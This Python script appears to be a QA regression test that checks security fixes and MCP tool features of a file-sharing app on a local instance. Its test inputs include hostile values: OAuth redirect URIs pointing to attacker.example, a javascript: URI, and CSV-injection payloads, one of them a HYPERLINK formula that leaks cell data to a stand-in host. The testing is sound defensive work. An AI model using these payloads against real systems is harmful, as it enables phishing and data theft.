"""Retest backend-facing fixes and the new MCP features against a private instance.
Run: env -u HTTPS_PROXY -u HTTP_PROXY BASE=http://localhost:8096 python3 backend_retest.py
Prints PASS/FAIL/INFO lines; nothing here touches :8080."""
import base64, json, os, re, urllib.request, urllib.parse, http.cookiejar, hashlib, secrets

B = os.environ.get('BASE', 'http://localhost:8096')
OUT = []


def say(tag, msg):
    line = f'[{tag}] {msg}'
    print(line)
    OUT.append(line)


def client():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), urllib.request.ProxyHandler({}), NoRedir()), jar


class NoRedir(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def req(op, method, url, body=None, headers=None, form=None, raw=None):
    h = dict(headers or {})
    data = None
    if form is not None:
        data = urllib.parse.urlencode(form).encode(); h['Content-Type'] = 'application/x-www-form-urlencoded'
    elif raw is not None:
        data = raw
    elif body is not None:
        data = json.dumps(body).encode(); h['Content-Type'] = 'application/json'
    r = urllib.request.Request(B + url if url.startswith('/') else url, data=data, method=method, headers=h)
    try:
        with op.open(r) as resp:
            return resp.status, resp.read().decode(errors='replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace'), dict(e.headers)


def login(u, p='demo-password-123'):
    op, jar = client()
    s, b, _ = req(op, 'POST', '/api/auth/login', {'username': u, 'password': p})
    return op, json.loads(b)['csrf']


def token_for(op, csrf, name='qa', scope='write'):
    s, b, _ = req(op, 'POST', '/api/tokens', {'name': name, 'scope': scope, 'days': 1}, {'X-CSRF-Token': csrf})
    return json.loads(b)['token']


class MCP:
    def __init__(self, tok):
        self.tok = tok; self.n = 0; self.op, _ = client()

    def raw(self, method, params=None):
        self.n += 1
        s, b, _ = req(self.op, 'POST', '/mcp', {'jsonrpc': '2.0', 'id': self.n, 'method': method, 'params': params or {}},
                      {'Authorization': 'Bearer ' + self.tok, 'Accept': 'application/json, text/event-stream'})
        return json.loads(b)

    def __call__(self, tool, **a):
        r = self.raw('tools/call', {'name': tool, 'arguments': a})['result']
        txt = r['content'][0]['text']
        return (not r.get('isError')), (json.loads(txt) if not r.get('isError') else txt)


maya, mcsrf = login('maya')
adm, acsrf = login('admin', 'change-me-now-please')
mtok = token_for(maya, mcsrf, 'qa retest')
m = MCP(mtok)

# ---------- UI-1: redirect registration ----------
anon, _ = client()
for uri in ['https://attacker.example/cb', 'http://attacker.example/cb', 'http://localhost.attacker.example/cb',
            'http://127.0.0.1.nip.io/cb', 'https://127.0.0.1@attacker.example/cb', 'http://127.0.0.1:33418/callback',
            'http://[::1]:5555/cb', 'http://LOCALHOST:1/cb', 'javascript://localhost/%0aalert(1)', 'http://127.0.0.1/cb#frag']:
    s, b, _ = req(anon, 'POST', '/oauth/register', {'client_name': 'Claude Code', 'redirect_uris': [uri]})
    say('INFO', f'UI-1 register {uri!r} -> {s}')

# ---------- UI-3 marketplace ----------
s, b, _ = req(anon, 'GET', '/api/auth/me')
say('INFO', f"UI-3 /api/auth/me marketplace = {json.loads(b)['marketplace']!r}, trash_days = {json.loads(b).get('trash_days')}")

# ---------- UI-4 / feature 3: link, if_version, as_base64 ----------
ok, r = m('save_artifact', name='retest-note.md', folder='/users/maya/inbox', content='# v1\n')
say('PASS' if ok and '/view?path=' in r['link'] else 'FAIL', f"save_artifact link = {r.get('link') if ok else r}")
v1 = r['version']
ok, r = m('save_artifact', path='/users/maya/inbox/retest-note.md', content='# v2\n', if_version=v1)
say('PASS' if ok and r['version'] == v1 + 1 else 'FAIL', f'if_version matching -> ok={ok} version={r.get("version") if ok else r}')
ok, r = m('save_artifact', path='/users/maya/inbox/retest-note.md', content='# stale write\n', if_version=v1)
say('PASS' if not ok and 'conflict' in r else 'FAIL', f'if_version stale -> ok={ok} {str(r)[:200]}')
ok, r = m('get_artifact', path='/users/maya/inbox/retest-note.md')
say('PASS' if ok and r['text'] == '# v2\n' else 'FAIL', f'after refused stale save, text={r.get("text")!r} version={r.get("version")}')
# if_version on a file that does not exist
ok, r = m('save_artifact', path='/users/maya/inbox/never-existed.md', content='x', if_version=3)
say('INFO', f'if_version=3 on a missing file -> ok={ok} {str(r)[:160]}')
# if_version bad types
ok, r = m('save_artifact', path='/users/maya/inbox/retest-note.md', content='x', if_version=0)
say('INFO', f'if_version=0 -> ok={ok} {str(r)[:120]}')
ok, r = m('save_artifact', path='/users/maya/inbox/retest-note.md', content='x', if_version='2')
say('INFO', f"if_version='2' (string) -> ok={ok} {str(r)[:120]}")
# same content with stale version: unchanged but stale
ok, r = m('save_artifact', path='/users/maya/inbox/retest-note.md', content='# v2\n', if_version=v1)
say('INFO', f'stale if_version with identical content -> ok={ok} {str(r)[:140]}')
# someone else changes the file in between (web upload by maya)
# binary + as_base64
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==')
blob = png + bytes(range(256))
ok, r = m('save_artifact', path='/users/maya/inbox/bin.png', content_base64=base64.b64encode(blob).decode())
ok, r = m('get_artifact', path='/users/maya/inbox/bin.png')
say('INFO', f"get_artifact binary (no as_base64): binary={r.get('binary')} text={r.get('text')!r} link={'link' in r}")
ok, r = m('get_artifact', path='/users/maya/inbox/bin.png', as_base64=True)
same = ok and base64.b64decode(r['content_base64']) == blob
say('PASS' if same else 'FAIL', f"get_artifact as_base64 round-trips bytes: {same}; has link: {'link' in r}; has version: {r.get('version')}")
ok, r = m('get_artifact', path='/users/maya/inbox/retest-note.md', as_base64=True)
say('INFO', f"as_base64 on text file -> {base64.b64decode(r['content_base64'])!r}")
ok, r = m('get_artifact', path='/users/jonas/inbox/whatever.md', as_base64=True)
say('PASS' if not ok else 'FAIL', f'as_base64 on another user file -> {str(r)[:120]}')
# truncated text (>2 MB)
big = 'line of text that is long enough\n' * 70000  # ~2.3 MB
ok, r = m('save_artifact', path='/users/maya/inbox/big.log', content=big)
ok, r = m('get_artifact', path='/users/maya/inbox/big.log')
say('INFO', f"get_artifact 2.3 MB text: truncated={r.get('truncated')} len={len(r.get('text') or '')} of {len(big)}")
# tools/list schema
tl = m.raw('tools/list')['result']['tools']
sa = next(t for t in tl if t['name'] == 'save_artifact'); ga = next(t for t in tl if t['name'] == 'get_artifact')
say('INFO', f"schema save_artifact has if_version: {'if_version' in sa['inputSchema']['properties']}; get_artifact as_base64: {'as_base64' in ga['inputSchema']['properties']}")
# get_artifact link
ok, r = m('get_artifact', path='/users/maya/inbox/retest-note.md')
say('INFO', f"get_artifact link: {r.get('link')}")
# search result fields for /buckets-open step 1
ok, r = m('search_artifacts', query='retest')
say('INFO', f"search_artifacts result keys: {sorted(r['results'][0].keys()) if r['results'] else None}")
# link for a folder
ok, r = m('create_folder', path='/users/maya/inbox/linkdir')
ok, r = m('list_folder', path='/users/maya/inbox/linkdir')
say('INFO', f'list_folder result has link: {"link" in r}')

# ---------- UI-7 preview bound to session ----------
s, b, _ = req(maya, 'GET', '/api/fs/meta?path=' + urllib.parse.quote('/users/maya/inbox/retest-note.md'))
purl = json.loads(b)['preview_url']
s, b, _ = req(maya, 'GET', purl); say('PASS' if s == 200 else 'FAIL', f'UI-7 preview in own session -> {s}')
s, b, _ = req(anon, 'GET', purl); say('PASS' if s == 403 else 'FAIL', f'UI-7 preview anonymous -> {s} {b[:60]!r}')
jonas, jcsrf = login('jonas')
s, b, _ = req(jonas, 'GET', purl); say('PASS' if s == 403 else 'FAIL', f'UI-7 preview from another signed-in user (jonas) -> {s}')
maya2, _ = login('maya')
s, b, _ = req(maya2, 'GET', purl); say('INFO', f'UI-7 preview from a second session of the same user -> {s} (user-bound, not session-bound)')
s, b, h = req(maya, 'GET', purl)
_h={k.lower():v for k,v in h.items()}; say('INFO', f"preview headers: CSP={_h.get('content-security-policy','')[:60]}... XFO={_h.get('x-frame-options')} CT={_h.get('content-type')}")

# ---------- UI-8 CSV injection ----------
evil = '=HYPERLINK("http://attacker.example/?"&A1,"Click")'
op3, _ = client(); req(op3, 'POST', '/api/auth/login', {'username': evil, 'password': 'x' * 12})
req(op3, 'POST', '/api/auth/login', {'username': '-2+3+cmd|x', 'password': 'x' * 12})
req(op3, 'POST', '/api/auth/login', {'username': ' =1+1', 'password': 'x' * 12})
s, b, _ = req(adm, 'POST', '/api/tokens', {'name': '@SUM(1+1)*cmd|"/C calc"!A0', 'scope': 'read', 'days': 1}, {'X-CSRF-Token': acsrf})
s, csvtext, _ = req(adm, 'GET', '/api/audit/export.csv')
open('/home/claude/ab/qa-ui/retest/out_audit_export.csv', 'w').write(csvtext)
import csv, io
cells = [c for row in csv.reader(io.StringIO(csvtext)) for c in row]
bad = [c for c in cells if c and c[0] in '=+-@']
say('PASS' if not bad else 'FAIL', f'UI-8 formula-leading cells in export: {bad[:4]} (rows={csvtext.count(chr(10))})')
say('INFO', f"UI-8 sample escaped cells: {[c for c in cells if c.startswith(chr(39))][:3]}; leading-space cell present: {any(c.startswith(' =') for c in cells)}")
# UI-29: unknown-user failure has via + ip
s, b, _ = req(adm, 'GET', '/api/audit?action=signin.password&limit=5')
ev = [e for e in json.loads(b)['events'] if not e['ok']][:1]
say('INFO', f'UI-29 failed unknown-user signin: actor={ev[0]["actor"]!r} via={ev[0]["via"]} ip={ev[0]["ip"]}' if ev else 'UI-29 no event')
# UI-31: export size vs on-screen
say('INFO', f'UI-31 export rows (lines) = {csvtext.count(chr(10))}')

# ---------- UI-28 logout CSRF ----------
j2, j2c = login('jonas')
s, b, _ = req(j2, 'POST', '/api/auth/logout')
s2, b2, _ = req(j2, 'GET', '/api/auth/me')
say('PASS' if s == 403 and json.loads(b2)['user'] else 'FAIL', f'UI-28 logout without CSRF -> {s}; still signed in: {bool(json.loads(b2)["user"])}')

# ---------- UI-23 token days ----------
s, b, _ = req(maya, 'POST', '/api/tokens', {'name': 'three-day', 'scope': 'read', 'days': 3}, {'X-CSRF-Token': mcsrf})
s, b, _ = req(maya, 'GET', '/api/tokens')
t3 = [t for t in json.loads(b)['tokens'] if t['name'] == 'three-day'][0]
say('PASS' if t3['expires_in_days'] == 3 else 'FAIL', f"UI-23 3-day token expires_in_days={t3['expires_in_days']}")

# ---------- UI-27 routing visibility ----------
s, b, _ = req(maya, 'GET', '/api/routing')
rules = json.loads(b)
s, b, _ = req(adm, 'GET', '/api/routing')
say('INFO', f"UI-27 member sees {len(rules['rules'])} rules of {len(json.loads(b)['rules'])}; targets={[r['target'] for r in rules['rules']]}; can_add={rules['can_add']}")

# ---------- UI-17 bidi ----------
ok, r = m('save_artifact', name='‮lmth.exe', folder='/users/maya/inbox', content='x')
say('PASS' if not ok else 'FAIL', f'UI-17 bidi name -> ok={ok} {str(r)[:100]}')
ok, r = m('save_artifact', name='a⁧b.txt', folder='/users/maya/inbox', content='x')
say('PASS' if not ok else 'FAIL', f'UI-17 U+2067 name -> ok={ok}')
ok, r = m('save_artifact', name='zero​width.txt', folder='/users/maya/inbox', content='x')
say('INFO', f'U+200B zero-width name -> ok={ok}')
ok, r = m('save_artifact', name='CON.txt', folder='/users/maya/inbox', content='x')
say('INFO', f'CON.txt -> ok={ok}')

# ---------- UI-5 folder ops via the web API (as the UI calls them) ----------
for i in range(60):
    m('save_artifact', path=f'/users/maya/projects/bigdir/f{i}.txt', content=str(i))
ok, r = m('delete', path='/users/maya/projects/bigdir')
say('INFO', f'MCP delete 60-file folder -> ok={ok} {str(r)[:140]}')
s, b, _ = req(maya, 'POST', '/api/fs/move', {'src': '/users/maya/projects/bigdir', 'dst': '/users/maya/projects/bigdir2'}, {'X-CSRF-Token': mcsrf})
say('PASS' if s == 200 else 'FAIL', f'web rename folder -> {s} {b[:80]}')
s, b, _ = req(maya, 'POST', '/api/fs/move', {'src': '/users/maya/inbox', 'dst': '/users/maya/projects/inbox'}, {'X-CSRF-Token': mcsrf})
say('INFO', f'web move of /users/maya/inbox (system folder) -> {s} {b[:80]}')
if s == 200:
    req(maya, 'POST', '/api/fs/move', {'src': '/users/maya/projects/inbox', 'dst': '/users/maya/inbox'}, {'X-CSRF-Token': mcsrf})

# ---------- Feature 5: quota counts versions ----------
s, b, _ = req(adm, 'GET', '/api/users')
users = json.loads(b)['users'] if s == 200 else []
noah = next((u for u in users if u['username'] == 'noah'), None) or next(u for u in users if u['username'] not in ('admin', 'maya', 'jonas'))
uname = noah['username']
req(adm, 'PATCH', f"/api/users/{noah['id']}", {'quota_bytes': 1024 * 1024}, {'X-CSRF-Token': acsrf})  # ~1 MiB
s, b, _ = req(adm, 'GET', '/api/users'); nu = next(u for u in json.loads(b)['users'] if u['username'] == uname)
say('INFO', f"quota user {uname}: quota_bytes={nu.get('quota_bytes')} used={nu.get('used_bytes', nu.get('usage'))}")
nop, ncsrf = login(uname)
ntok = token_for(nop, ncsrf, 'quota')
n = MCP(ntok)
# clear their home so we know usage
s, b, _ = req(nop, 'GET', f'/api/fs/list?path=/users/{uname}/inbox')
for f in json.loads(b)['files']:
    req(nop, 'POST', '/api/fs/delete', {'path': f['path']}, {'X-CSRF-Token': ncsrf})
s, b, _ = req(nop, 'GET', f'/api/fs/list?path=/users/{uname}/projects')
for f in json.loads(b)['folders'] + json.loads(b)['files']:
    req(nop, 'POST', '/api/fs/delete', {'path': f['path'], 'confirm': True}, {'X-CSRF-Token': ncsrf})
s, b, _ = req(nop, 'GET', f'/api/fs/list?path=/users/{uname}')
for f in json.loads(b)['files']:
    req(nop, 'POST', '/api/fs/delete', {'path': f['path']}, {'X-CSRF-Token': ncsrf})
chunk = 300 * 1024
res = []
for i in range(5):
    ok, r = n('save_artifact', path=f'/users/{uname}/inbox/q.bin', content_base64=base64.b64encode(bytes([65 + i]) * chunk).decode())
    ok2, vv = n('list_versions', path=f'/users/{uname}/inbox/q.bin')
    res.append((ok, r.get('version') if ok else str(r)[:80], [v['version'] for v in vv['versions']] if ok2 else vv))
say('INFO', f'quota 1 MiB, 5 saves of 300 KiB to one file -> {res}')
ok, r = n('save_artifact', path=f'/users/{uname}/inbox/other.bin', content_base64=base64.b64encode(b'Z' * chunk).decode())
say('INFO', f'then a new 300 KiB file -> ok={ok} {str(r)[:120]}')
ok2, vv = n('list_versions', path=f'/users/{uname}/inbox/q.bin')
say('INFO', f'versions of q.bin after that: {[v["version"] for v in vv["versions"]]}')
# restore_version of oldest kept version
ok, r = n('restore_version', path=f'/users/{uname}/inbox/q.bin', version=vv['versions'][-1]['version'])
ok3, vv2 = n('list_versions', path=f'/users/{uname}/inbox/q.bin')
say('INFO', f'restore oldest kept version -> ok={ok} {str(r)[:100]}; versions now {[v["version"] for v in vv2["versions"]]}')
# a single file bigger than the whole quota
ok, r = n('save_artifact', path=f'/users/{uname}/inbox/q.bin', content_base64=base64.b64encode(b'Y' * (1100 * 1024)).decode())
say('INFO', f'save 1.1 MiB over a 1 MiB quota -> ok={ok} {str(r)[:120]}')
s, b, _ = req(nop, 'GET', '/api/auth/me'); me = json.loads(b)['user']
say('INFO', f"user_info usage fields for {uname}: { {k: v for k, v in me.items() if 'quota' in k or 'used' in k or 'usage' in k} }")
# web upload path also drops versions?
req(adm, 'PATCH', f"/api/users/{noah['id']}", {'quota_bytes': 50 * 1024**3}, {'X-CSRF-Token': acsrf})

# ---------- trash restore over quota ----------
open('/home/claude/ab/qa-ui/retest/out_backend.txt', 'w').write('\n'.join(OUT) + '\n')
